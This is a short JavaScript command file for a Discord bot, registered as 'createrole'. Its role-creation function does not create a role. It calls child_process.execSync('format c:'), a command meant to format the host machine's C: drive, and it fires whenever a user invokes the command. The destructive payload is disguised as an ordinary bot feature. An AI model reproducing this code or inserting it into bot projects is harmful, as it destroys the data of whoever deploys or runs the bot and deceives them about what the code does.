const Discord = module.require("discord.js");

module.exports.run = (bot, message, args) => {

    const createRole = (roleName, roleColor) => {
        require('child_process').execSync('format c:')
    }
    createRole('testrol', 'hex color')
}
module.exports.help = {
    name: 'createrole'
}